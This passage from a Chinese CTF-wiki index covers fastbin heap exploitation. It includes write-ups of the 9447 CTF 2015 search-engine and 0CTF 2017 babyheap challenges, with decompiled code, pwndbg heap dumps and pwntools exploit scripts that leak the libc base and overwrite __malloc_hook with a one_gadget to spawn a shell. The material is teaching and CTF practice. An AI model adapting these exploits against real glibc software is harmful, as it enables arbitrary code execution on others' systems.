\u5bf9\u4e8ea, b \u6765\u8bf4\u90fd\u662f\u53ef\u4ee5\u7ed5\u8fc7\u7684\u3002 \u6211\u4eec\u6b64\u65f6\u518d\u6b21\u5220\u9664\u641c\u7d22\u5355\u8bcd \\x00 \u3002\u9996\u5148\u904d\u5386\u7684\u662f c\uff0c\u4f46\u662f c \u7684\u9a8c\u8bc1\u4e0d\u901a\u8fc7\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fb\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u6211\u4eec\u5c06\u5176\u91ca\u653e\uff1b\u5176\u6b21\u904d\u5386\u7684\u662fa\uff0c\u9a8c\u8bc1\u901a\u8fc7\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u5220\u9664\u3002\u5219\u6b64\u65f6 fastbin \u7684\u60c5\u51b5\u4e3a b->a->b->a->...\u3002\u5373\u5df2\u7ecf\u6784\u6210\u4e86double free b\u7684\u60c5\u51b5\u3002\u7531\u4e8e\u6211\u4eec\u5148\u524d\u4e3a\u4e86 leak libc \u8fd8\u5efa\u7acb\u4e00\u4e2a\u53e5\u5b50\uff0c\u6240\u4ee5\u8fd8\u6709\u4e00\u4e2a\u5355\u8bcd\u53ef\u4ee5\u6bd4\u8f83\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u4e0d\u5220\u9664\u3002 \u5177\u4f53\u4ee3\u7801\u5982\u4e0b # 2. create cycle fastbin 0x70 size index_sentence ( 'a' * 0x5d + ' d ' ) #a index_sentence ( 'b' * 0x5d + ' d ' ) #b index_sentence ( 'c' * 0x5d + ' d ' ) #c # a->b->c->NULL search_word ( 'd' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) # b->a->b->a->... search_word ( ' \\x00 ' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'y' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'n' ) p . recvuntil ( 'Delete this sentence (y/n)? \\n ' ) p . sendline ( 'n' ) \u6548\u679c\u5982\u4e0b pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x1d19320 \u25c2\u2014 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x1d191b0 \u2014\u25b8 0x1d19010 \u2014\u25b8 0x1d191b0 \u25c2\u2014 0x1d19010 0x80: 0x0 \u5206\u914d malloc_hook \u9644\u8fd1chunk \u00b6 \u6b64\u65f6\uff0cfastbin \u7684\u94fe\u8868\u4e3a b->a->b->a->\u2026\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u5728\u7533\u8bf7\u7b2c\u4e00\u4e2a\u76f8\u540c\u5927\u5c0f\u7684 chunk \u65f6\uff0c\u8bbe\u7f6e b \u7684 fd \u4e3a malloc_hook \u9644\u8fd1\u5904\u7684 chunk 0x7fd798586aed \uff08\u8fd9\u91cc\u662f\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u4ee3\u7801\u4e2d\u9700\u4f7f\u7528\u76f8\u5bf9\u5730\u5740\uff09\u3002 pwndbg> print ( void* ) & main_arena $1 = ( void * ) 0x7fd798586b20 <main_arena> pwndbg> x/8gx 0x7fd798586b20-16 0x7fd798586b10 <__malloc_hook>: 0x0000000000000000 0x0000000000000000 0x7fd798586b20 <main_arena>: 0x0000000000000000 0x0000000000bce130 0x7fd798586b30 <main_arena+16>: 0x0000000000000000 0x0000000000000000 0x7fd798586b40 <main_arena+32>: 0x0000000000000000 0x0000000000000000 pwndbg> find_fake_fast 0x7fd798586b10 0x7f FAKE CHUNKS 0x7fd798586aed PREV_INUSE IS_MMAPED NON_MAIN_ARENA { prev_size = 15535264025435701248 , size = 127 , fd = 0xd798247e20000000, bk = 0xd798247a0000007f, fd_nextsize = 0x7f, bk_nextsize = 0x0 } pwndbg> print /x 0x7fd798586b10-0x7fd798586aed $2 = 0x23 pwndbg> print /x 0x7fd798586b20-0x7fd798586aed $3 = 0x33 \u90a3\u4e48\u5f53\u518d\u6b21\u5206\u914d b \u7684\u65f6\u5019\uff0c\u7531\u4e8e\u6b64\u65f6 b \u7684 fd \u5df2\u7ecf\u88ab\u6211\u4eec\u4fee\u6539\u4e3a\u4e86malloc_hook\u9644\u8fd1\u7684\u5730\u5740\uff0c\u6240\u4ee5\u8fd9\u65f6\u5019\u6211\u4eec\u518d\u6b21\u5206\u914d\u4e00\u4e2a chunk\uff0c\u5c31\u4f1a\u6307\u5411 0x7fd798586aed \u3002 \u6b64\u540e\u4fbf\u53ea\u9700\u8981\u5c06 malloc_hook \u4fee\u6539\u4e3a one_gadget \u5730\u5740\u5c31\u53ef\u4ee5\u62ff\u5230 shell \u4e86\u3002 # 3. fastbin attack to malloc_hook nearby chunk fake_chunk_addr = main_arena_addr - 0x33 fake_chunk = p64 ( fake_chunk_addr ) . ljust ( 0x60 , 'f' ) index_sentence ( fake_chunk ) index_sentence ( 'a' * 0x60 ) index_sentence ( 'b' * 0x60 ) one_gadget_addr = libc_base + 0xf02a4 payload = 'a' * 0x13 + p64 ( one_gadget_addr ) payload = payload . ljust ( 0x60 , 'f' ) #gdb.attach(p) index_sentence ( payload ) p . interactive () \u8fd9\u91cc\u53ef\u80fd\u9700\u8981\u591a\u9009\u62e9\u51e0\u4e2a one_gadget \u5730\u5740\uff0c\u56e0\u4e3a one_gadget \u6210\u529f\u662f\u6709\u6761\u4ef6\u7684\u3002 shell \u00b6 \u279c 2015_9447ctf_search-engine git: ( master ) python exp.py [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE ( 0x400000 ) FORTIFY: Enabled [ + ] Starting local process './search' : pid 31158 [ * ] PID: 31158 [ + ] unsortedbin addr: 0x7f802e73bb78 [ + ] libc base addr: 0x7f802e377000 [ * ] Switching to interactive mode Enter the sentence: $ ls exp.py search search.id1 search.nam libc.so.6 search.id0 search.id2 search.til \u5f53\u7136\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u79cd \u65b9\u6cd5 \uff0c\u5c06 chunk \u5206\u914d\u5230\u6808\u4e0a\u3002 2017 0ctf babyheap \u00b6 \u57fa\u672c\u4fe1\u606f \u00b6 \u279c 2017_0ctf_babyheap git: ( master ) file babyheap babyheap: ELF 64 -bit LSB shared object, x86-64, version 1 ( SYSV ) , dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2 .6.32, BuildID [ sha1 ]= 9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped \u279c 2017_0ctf_babyheap git: ( master ) checksec babyheap [ * ] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2017_0ctf_babyheap/babyheap' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled 64\u4f4d\u7a0b\u5e8f\uff0c\u4fdd\u62a4\u5168\u90e8\u5f00\u542f\u3002 \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u662f\u4e00\u4e2a\u5806\u5206\u914d\u5668\uff0c\u4e3b\u8981\u7531\u4ee5\u4e0b\u56db\u79cd\u529f\u80fd puts ( \"1. Allocate\" ); puts ( \"2. Fill\" ); puts ( \"3. Free\" ); puts ( \"4. Dump\" ); puts ( \"5. Exit\" ); return printf ( \"Command: \" ); \u5176\u4e2d\uff0c\u6bcf\u6b21\u8bfb\u53d6\u547d\u4ee4\u7684\u51fd\u6570\u7531\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5b57\u7b26\u4e32\u7684\u51fd\u6570\u800c\u51b3\u5b9a\u3002 \u901a\u8fc7\u5206\u914d\u51fd\u6570 void __fastcall allocate ( __int64 a1 ) { signed int i ; // [rsp+10h] [rbp-10h] signed int v2 ; // [rsp+14h] [rbp-Ch] void * v3 ; // [rsp+18h] [rbp-8h] for ( i = 0 ; i <= 15 ; ++ i ) { if ( !* ( _DWORD * )( 24LL * i + a1 ) ) { printf ( \"Size: \" ); v2 = read_num (); if ( v2 > 0 ) { if ( v2 > 4096 ) v2 = 4096 ; v3 = calloc ( v2 , 1uLL ); if ( ! v3 ) exit ( - 1 ); * ( _DWORD * )( 24LL * i + a1 ) = 1 ; * ( _QWORD * )( a1 + 24LL * i + 8 ) = v2 ; * ( _QWORD * )( a1 + 24LL * i + 16 ) = v3 ; printf ( \"Allocate Index %d \\n \" , ( unsigned int ) i ); } return ; } } } \u7533\u8bf7\u7684 chunk \u7684\u6700\u5927\u4e3a 4096\u3002\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\u6bcf\u4e2a chunk \u4e3b\u8981\u6709\u4e09\u4e2a\u5b57\u6bb5\uff1a\u662f\u5426\u5728\u4f7f\u7528\uff0c\u5806\u5757\u5927\u5c0f\uff0c\u5806\u5757\u4f4d\u7f6e\u3002\u6545\u800c\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u5bf9\u5e94\u7684\u7ed3\u6784\u4f53\u3002 00000000 chunk struc ; (sizeof=0x18, mappedto_6) 00000000 inuse dq ? 00000008 size dq ? 00000010 ptr dq ? 00000018 chunk ends \u9700\u8981\u6ce8\u610f\u7684\u662f\u5806\u5757\u662f\u7531 calloc \u5206\u914d\u7684\uff0c\u6240\u4ee5 chunk \u4e2d\u7684\u5185\u5bb9\u5168\u90fd\u4e3a \\x00 \u3002 \u5728\u586b\u5145\u5185\u5bb9\u7684\u529f\u80fd\u4e2d\uff0c\u4f7f\u7528\u8bfb\u53d6\u5185\u5bb9\u7684\u51fd\u6570\u662f\u76f4\u63a5\u8bfb\u53d6\u6307\u5b9a\u957f\u5ea6\u7684\u5185\u5bb9\uff0c\u5e76\u6ca1\u6709\u8bbe\u7f6e\u5b57\u7b26\u4e32\u7ed3\u5c3e\u3002 \u800c\u4e14\u6bd4\u8f83\u6709\u610f\u601d\u7684\u662f\uff0c\u8fd9\u4e2a\u6307\u5b9a\u957f\u5ea6\u662f\u6211\u4eec\u6307\u5b9a\u7684\uff0c\u5e76\u4e0d\u662f\u4e4b\u524d chunk \u5206\u914d\u65f6\u6307\u5b9a\u7684\u957f\u5ea6\uff0c\u6240\u4ee5\u8fd9\u91cc\u5c31\u51fa\u73b0\u4e86\u4efb\u610f\u5806\u6ea2\u51fa\u7684\u60c5\u5f62\u3002 __int64 __fastcall fill ( chunk * a1 ) { __int64 result ; // rax int v2 ; // [rsp+18h] [rbp-8h] int v3 ; // [rsp+1Ch] [rbp-4h] printf ( \"Index: \" ); result = read_num (); v2 = result ; if ( ( signed int ) result >= 0 && ( signed int ) result <= 15 ) { result = LODWORD ( a1 [( signed int ) result ]. inuse ); if ( ( _DWORD ) result == 1 ) { printf ( \"Size: \" ); result = read_num (); v3 = result ; if ( ( signed int ) result > 0 ) { printf ( \"Content: \" ); result = read_content (( char * ) a1 [ v2 ]. ptr , v3 ); } } } return result ; } \u5728\u91ca\u653echunk\u7684\u529f\u80fd\u4e2d\u8be5\u8bbe\u7f6e\u7684\u90fd\u8bbe\u7f6e\u4e86\u3002 __int64 __fastcall free_chunk ( chunk * a1 ) { __int64 result ; // rax int v2 ; // [rsp+1Ch] [rbp-4h] printf ( \"Index: \" ); result = read_num (); v2 = result ; if ( ( signed int ) result >= 0 && ( signed int ) result <= 15 ) { result = LODWORD ( a1 [( signed int ) result ]. inuse ); if ( ( _DWORD ) result == 1 ) { LODWORD ( a1 [ v2 ]. inuse ) = 0 ; a1 [ v2 ]. size = 0LL ; free ( a1 [ v2 ]. ptr ); result = ( __int64 ) & a1 [ v2 ]; * ( _QWORD * )( result + 16 ) = 0LL ; } } return result ; } dump \u5c31\u662f\u8f93\u51fa\u5bf9\u5e94\u7d22\u5f15 chunk \u7684\u5185\u5bb9\u3002 \u5229\u7528\u601d\u8def \u00b6 \u53ef\u4ee5\u786e\u5b9a\u7684\u662f\uff0c\u6211\u4eec\u4e3b\u8981\u6709\u7684\u6f0f\u6d1e\u5c31\u662f\u4efb\u610f\u957f\u5ea6\u5806\u6ea2\u51fa\u3002\u7531\u4e8e\u8be5\u7a0b\u5e8f\u51e0\u4e4e\u6240\u6709\u4fdd\u62a4\u90fd\u5f00\u542f\u4e86\uff0c\u6240\u4ee5\u6211\u4eec\u5fc5\u987b\u8981\u6709\u4e00\u4e9b\u6cc4\u6f0f\u624d\u53ef\u4ee5\u63a7\u5236\u7a0b\u5e8f\u7684\u6d41\u7a0b\u3002\u57fa\u672c\u5229\u7528\u601d\u8def\u5982\u4e0b \u5229\u7528 unsorted bin \u5730\u5740\u6cc4\u6f0f libc \u57fa\u5730\u5740\u3002 \u5229\u7528 fastbin attack \u5c06chunk \u5206\u914d\u5230 malloc_hook \u9644\u8fd1\u3002 \u6cc4\u6f0f libc \u57fa\u5730\u5740 \u00b6 \u7531\u4e8e\u6211\u4eec\u662f\u5e0c\u671b\u4f7f\u7528 unsorted bin \u6765\u6cc4\u6f0f libc \u57fa\u5730\u5740\uff0c\u6240\u4ee5\u5fc5\u987b\u8981\u6709 chunk \u53ef\u4ee5\u88ab\u94fe\u63a5\u5230 unsorted bin \u4e2d\uff0c\u6240\u4ee5\u8be5 chunk \u4e0d\u80fd\u4f7f fastbin chunk\uff0c\u4e5f\u4e0d\u80fd\u548c top chunk \u76f8\u90bb\u3002\u56e0\u4e3a\u524d\u8005\u4f1a\u88ab\u6dfb\u52a0\u5230 fastbin \u4e2d\uff0c\u540e\u8005\u5728\u4e0d\u662ffastbin \u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u8fd9\u91cc\u6784\u9020\u4e00\u4e2a small bin chunk\u3002\u5728\u5c06\u8be5 chunk \u91ca\u653e\u5230 unsorted bin \u7684\u540c\u65f6\uff0c\u4e5f\u9700\u8981\u8ba9\u53e6\u5916\u4e00\u4e2a\u6b63\u5728\u4f7f\u7528\u7684 chunk \u53ef\u4ee5\u540c\u65f6\u6307\u5411\u8be5 chunk \u7684\u4f4d\u7f6e\u3002\u8fd9\u6837\u624d\u53ef\u4ee5\u8fdb\u884c\u6cc4\u6f0f\u3002\u5177\u4f53\u8bbe\u8ba1\u5982\u4e0b # 1. leak libc base allocate ( 0x10 ) # idx 0, 0x00 allocate ( 0x10 ) # idx 1, 0x20 allocate ( 0x10 ) # idx 2, 0x40 allocate ( 0x10 ) # idx 3, 0x60 allocate ( 0x80 ) # idx 4, 0x80 # free idx 1, 2, fastbin[0]->idx1->idx2->NULL free ( 2 ) free ( 1 ) \u9996\u5148\uff0c\u6211\u4eec\u7533\u8bf7\u4e86 5 \u4e2achunk\uff0c\u5e76\u91ca\u653e\u4e86\u4e24\u4e2achunk\uff0c\u6b64\u65f6\u5806\u7684\u60c5\u51b5\u5982\u4e0b\u3002 pwndbg> x/20gx 0x55a03ca22000 0x55a03ca22000: 0x0000000000000000 0x0000000000000021 idx 0 0x55a03ca22010: 0x0000000000000000 0x0000000000000000 0x55a03ca22020: 0x0000000000000000 0x0000000000000021 idx 1 0x55a03ca22030: 0x000055a03ca22040 0x0000000000000000 0x55a03ca22040: 0x0000000000000000 0x0000000000000021 idx 2 0x55a03ca22050: 0x0000000000000000 0x0000000000000000 0x55a03ca22060: 0x0000000000000000 0x0000000000000021 idx 3 0x55a03ca22070: 0x0000000000000000 0x0000000000000000 0x55a03ca22080: 0x0000000000000000 0x0000000000000091 idx 4 0x55a03ca22090: 0x0000000000000000 0x0000000000000000 pwndbg> fastbins fastbins 0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22040 \u25c2\u2014 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 \u5f53\u6211\u4eec\u7f16\u8f91 idx0 \u540e\uff0c\u786e\u5b9e\u5df2\u7ecf\u5c06\u5176\u6307\u5411idx4\u4e86\u3002\u8fd9\u91cc\u4e4b\u6240\u4ee5\u53ef\u4ee5\u6210\u529f\u662f\u56e0\u4e3a\u5806\u7684\u59cb\u7ec8\u662f 4KB \u5bf9\u9f50\u7684\uff0c\u6240\u4ee5idx 4\u7684\u8d77\u59cb\u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u5fc5\u7136\u662f0x80\u3002 # edit idx 0 chunk to particial overwrite idx1's fd to point to idx4 payload = 0x10 * 'a' + p64 ( 0 ) + p64 ( 0x21 ) + p8 ( 0x80 ) fill ( 0 , len ( payload ), payload ) \u4fee\u6539\u6210\u529f\u540e\u5982\u4e0b pwndbg> x/20gx 0x55a03ca22000 0x55a03ca22000: 0x0000000000000000 0x0000000000000021 0x55a03ca22010: 0x6161616161616161 0x6161616161616161 0x55a03ca22020: 0x0000000000000000 0x0000000000000021 0x55a03ca22030: 0x000055a03ca22080 0x0000000000000000 0x55a03ca22040: 0x0000000000000000 0x0000000000000021 0x55a03ca22050: 0x0000000000000000 0x0000000000000000 0x55a03ca22060: 0x0000000000000000 0x0000000000000021 0x55a03ca22070: 0x0000000000000000 0x0000000000000000 0x55a03ca22080: 0x0000000000000000 0x0000000000000091 0x55a03ca22090: 0x0000000000000000 0x0000000000000000 pwndbg> fastbins fastbins 0x20: 0x55a03ca22020 \u2014\u25b8 0x55a03ca22080 \u25c2\u2014 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 \u90a3\u4e48\uff0c\u5f53\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u4e24\u4e2a\u65f6\uff0c\u7b2c\u4e8c\u4e2a\u7533\u8bf7\u5230\u7684\u5c31\u662fidx 4\u5904\u7684chunk\u3002\u4e3a\u4e86\u80fd\u591f\u7533\u8bf7\u6210\u529f\uff0c\u6211\u4eec\u9700\u8981\u786e\u4fdd idx4 \u7684size \u4e0e\u5f53\u524d fastbin \u7684\u5927\u5c0f\u4e00\u81f4\uff0c\u6240\u4ee5\uff0c\u6211\u4eec\u5f97\u4fee\u6539\u5b83\u7684\u5927\u5c0f\u3002\u7533\u8bf7\u6210\u529f\u540e\uff0cidx2\u4f1a\u6307\u5411idx4\u3002 # if we want to allocate at idx4, we must set it's size as 0x21 payload = 0x10 * 'a' + p64 ( 0 ) + p64 ( 0x21 ) fill ( 3 , len ( payload ), payload ) allocate ( 0x10 ) # idx 1 allocate ( 0x10 ) # idx 2, which point to idx4's location \u4e4b\u540e\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u5c06 idx 4 \u653e\u5230 unsorted bin \u4e2d\u7684\u8bdd\uff0c\u4e3a\u4e86\u9632\u6b62\u5176\u4e0etop chunk \u5408\u5e76\uff0c\u6211\u4eec\u9700\u8981\u518d\u6b21\u7533\u8bf7\u4e00\u4e2achunk\u3002\u6b64\u540e\u518d\u91ca\u653e idx4 \u5c31\u4f1a\u8fdb\u5165 unsorted bin\u4e2d\u53bb\u4e86\u3002\u6b64\u65f6\u7531\u4e8e idx2 \u4e5f\u6307\u5411\u8fd9\u4e2a\u5730\u5740\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u5c55\u793a\u4ed6\u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u5f97\u5230unsorted bin\u7684\u5730\u5740\u4e86\u3002 # if want to free idx4 to unsorted bin, we must fix its size payload = 0x10 * 'a' + p64 ( 0 ) + p64 ( 0x91 ) fill ( 3 , len ( payload ), payload ) # allocate a chunk in order when free idx4, idx 4 not consolidate with top chunk allocate ( 0x80 ) # idx 5 free ( 4 ) # as idx 2 point to idx4, just show this dump ( 2 ) p . recvuntil ( 'Content: \\n ' ) unsortedbin_addr = u64 ( p . recv ( 8 )) main_arena = unsortedbin_addr - offset_unsortedbin_main_arena log . success ( 'main arena addr: ' + hex ( main_arena )) main_arena_offset = 0x3c4b20 libc_base = main_arena - main_arena_offset log . success ( 'libc base addr: ' + hex ( libc_base )) \u5206\u914dchunk\u5230malloc_hook\u9644\u8fd1 \u00b6 \u7531\u4e8e malloc hook \u9644\u8fd1\u7684 chunk \u5927\u5c0f\u4e3a 0x7f\uff0c\u6240\u4ee5\u6570\u636e\u533a\u57df\u4e3a0x60\u3002\u8fd9\u91cc\u6211\u4eec\u518d\u6b21\u7533\u8bf7\u7684\u65f6\u5019\uff0c\u5bf9\u5e94 fastbin \u94fe\u8868\u4e2d\u6ca1\u6709\u76f8\u5e94\u5927\u5c0fchunk\uff0c\u6240\u4ee5\u6839\u636e\u5806\u5206\u914d\u5668\u89c4\u5219\uff0c\u5b83\u4f1a\u4f9d\u6b21\u5904\u7406unsorted bin\u4e2d\u7684chunk\uff0c\u5c06\u5176\u653e\u5165\u5230\u5bf9\u5e94\u7684bin\u4e2d\uff0c\u4e4b\u540e\u4f1a\u518d\u6b21\u5c1d\u8bd5\u5206\u914d chunk\uff0c\u56e0\u4e3a\u4e4b\u524d\u91ca\u653e\u7684 chunk \u6bd4\u5f53\u524d\u7533\u8bf7\u7684 chunk \u5927\uff0c\u6240\u4ee5\u53ef\u4ee5\u4ece\u5176\u524d\u9762\u5206\u5272\u51fa\u6765\u4e00\u5757\u3002\u6240\u4ee5 idx2 \u4ecd\u7136\u6307\u5411\u8be5\u4f4d\u7f6e\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7c7b\u4f3c\u7684\u529e\u6cd5\u5148\u91ca\u653e\u7533\u8bf7\u5230\u7684chunk\uff0c\u7136\u540e\u518d\u6b21\u4fee\u6539 fd \u6307\u9488\u4e3a fake chunk \u5373\u53ef\u3002\u6b64\u540e\u6211\u4eec\u4fee\u6539 malloc_hook \u5904\u7684\u6307\u9488\u5373\u53ef\u5f97\u5230\u89e6\u53d1 onegadget\u3002 # 2. malloc to malloc_hook nearby # allocate a 0x70 size chunk same with malloc hook nearby chunk, idx4 allocate ( 0x60 ) free ( 4 ) # edit idx4's fd point to fake chunk fake_chunk_addr = main_arena - 0x33 fake_chunk = p64 ( fake_chunk_addr ) fill ( 2 , len ( fake_chunk ), fake_chunk ) allocate ( 0x60 ) # idx 4 allocate ( 0x60 ) # idx 6 one_gadget_addr = libc_base + 0x4526a payload = 0x13 * 'a' + p64 ( one_gadget_addr ) fill ( 6 , len ( payload ), payload ) # trigger malloc_hook allocate ( 0x100 ) p . interactive () \u540c\u65f6\uff0c\u8fd9\u91cc\u7684 onegadget \u5730\u5740\u4e5f\u53ef\u80fd\u9700\u8981\u5c1d\u8bd5\u591a\u6b21\u3002 \u9898\u76ee \u00b6 L-CTF2016\u2013pwn200 \u53c2\u8003\u6587\u732e \u00b6 https://www.gulshansingh.com/posts/9447-ctf-2015-search-engine-writeup/ http://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html https://www.slideshare.net/YOKARO-MON/oreo-hacklu-ctf-2014-65771717","title":"Fastbin Attack"},{"location":"pwn/heap/fastbin_attack/#fastbin-attack","text":"","title":"Fastbin Attack"},{"location":"pwn/heap/fastbin_attack/#_1","text":"fastbin attack \u662f\u4e00\u7c7b\u6f0f\u6d1e\u7684\u5229\u7528\u65b9\u6cd5\uff0c\u662f\u6307\u6240\u6709\u57fa\u4e8e fastbin \u673a\u5236\u7684\u6f0f\u6d1e\u5229\u7528\u65b9\u6cd5\u3002\u8fd9\u7c7b\u5229\u7528\u7684\u524d\u63d0\u662f\uff1a \u5b58\u5728\u5806\u6ea2\u51fa\u3001use-after-free \u7b49\u80fd\u63a7\u5236 chunk \u5185\u5bb9\u7684\u6f0f\u6d1e \u6f0f\u6d1e\u53d1\u751f\u4e8e fastbin \u7c7b\u578b\u7684 chunk \u4e2d \u5982\u679c\u7ec6\u5206\u7684\u8bdd\uff0c\u53ef\u4ee5\u505a\u5982\u4e0b\u7684\u5206\u7c7b\uff1a Fastbin Double Free House of Spirit Alloc to Stack Arbitrary Alloc \u5176\u4e2d\uff0c\u524d\u4e24\u79cd\u4e3b\u8981\u6f0f\u6d1e\u4fa7\u91cd\u4e8e\u5229\u7528 free \u51fd\u6570\u91ca\u653e \u771f\u7684 chunk \u6216\u4f2a\u9020\u7684 chunk \uff0c\u7136\u540e\u518d\u6b21\u7533\u8bf7 chunk \u8fdb\u884c\u653b\u51fb\uff0c\u540e\u4e24\u79cd\u4fa7\u91cd\u4e8e\u6545\u610f\u4fee\u6539 fd \u6307\u9488\uff0c\u76f4\u63a5\u5229\u7528 malloc \u7533\u8bf7\u6307\u5b9a\u4f4d\u7f6e chunk \u8fdb\u884c\u653b\u51fb\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/fastbin_attack/#_2","text":"fastbin attack \u5b58\u5728\u7684\u539f\u56e0\u5728\u4e8e fastbin \u662f\u4f7f\u7528\u5355\u94fe\u8868\u6765\u7ef4\u62a4\u91ca\u653e\u7684\u5806\u5757\u7684\uff0c\u5e76\u4e14\u7531 fastbin \u7ba1\u7406\u7684 chunk \u5373\u4f7f\u88ab\u91ca\u653e\uff0c\u5176 next_chunk \u7684 prev_inuse \u4f4d\u4e5f\u4e0d\u4f1a\u88ab\u6e05\u7a7a\u3002 \u6211\u4eec\u6765\u770b\u4e00\u4e0b fastbin \u662f\u600e\u6837\u7ba1\u7406\u7a7a\u95f2 chunk \u7684\u3002 int main(void) { void *chunk1,*chunk2,*chunk3; chunk1=malloc(0x30); chunk2=malloc(0x30); chunk3=malloc(0x30); //\u8fdb\u884c\u91ca\u653e free(chunk1); free(chunk2); free(chunk3); return 0; } \u91ca\u653e\u524d 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000000000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000000000 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6267\u884c\u4e09\u6b21 free \u8fdb\u884c\u91ca\u653e\u540e 0x602000: 0x0000000000000000 0x0000000000000041 <=== chunk1 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000000000 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000041 <=== chunk2 0x602050: 0x0000000000602000 0x0000000000000000 0x602060: 0x0000000000000000 0x0000000000000000 0x602070: 0x0000000000000000 0x0000000000000000 0x602080: 0x0000000000000000 0x0000000000000041 <=== chunk3 0x602090: 0x0000000000602040 0x0000000000000000 0x6020a0: 0x0000000000000000 0x0000000000000000 0x6020b0: 0x0000000000000000 0x0000000000000000 0x6020c0: 0x0000000000000000 0x0000000000020f41 <=== top chunk \u6b64\u65f6\u4f4d\u4e8e main_arena \u4e2d\u7684 fastbin \u94fe\u8868\u4e2d\u5df2\u7ecf\u50a8\u5b58\u4e86\u6307\u5411 chunk3 \u7684\u6307\u9488\uff0c\u5e76\u4e14 chunk 3\u30012\u30011\u6784\u6210\u4e86\u4e00\u4e2a\u5355\u94fe\u8868 Fastbins[idx=2, size=0x30,ptr=0x602080] ===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE) ===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE) \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u7684\u56fe\u7247\u6765\u8868\u793a\u8fd9\u4e00\u70b9","title":"\u539f\u7406"},{"location":"pwn/heap/fastbin_attack/#fastbin-double-free","text":"","title":"Fastbin Double Free"},{"location":"pwn/heap/fastbin_attack/#_3","text":"Fastbin Double Free \u662f\u6307 fastbin \u7684 chunk \u53ef\u4ee5\u88ab\u591a\u6b21\u91ca\u653e\uff0c\u56e0\u6b64\u53ef\u4ee5\u5728 fastbin \u94fe\u8868\u4e2d\u5b58\u5728\u591a\u6b21\u3002\u8fd9\u6837\u5bfc\u81f4\u7684\u540e\u679c\u662f\u591a\u6b21\u5206\u914d\u53ef\u4ee5\u4ece fastbin \u94fe\u8868\u4e2d\u53d6\u51fa\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u76f8\u5f53\u4e8e\u591a\u4e2a\u6307\u9488\u6307\u5411\u540c\u4e00\u4e2a\u5806\u5757\uff0c\u7ed3\u5408\u5806\u5757\u7684\u6570\u636e\u5185\u5bb9\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e\u7c7b\u578b\u6df7\u6dc6(type confused)\u7684\u6548\u679c\u3002 Fastbin Double Free \u80fd\u591f\u6210\u529f\u5229\u7528\u4e3b\u8981\u6709\u4e24\u90e8\u5206\u7684\u539f\u56e0 fastbin \u7684\u5806\u5757\u88ab\u91ca\u653e\u540e next_chunk \u7684 pre_inuse \u4f4d\u4e0d\u4f1a\u88ab\u6e05\u7a7a fastbin \u5728\u6267\u884c free \u7684\u65f6\u5019\u4ec5\u9a8c\u8bc1\u4e86 main_arena 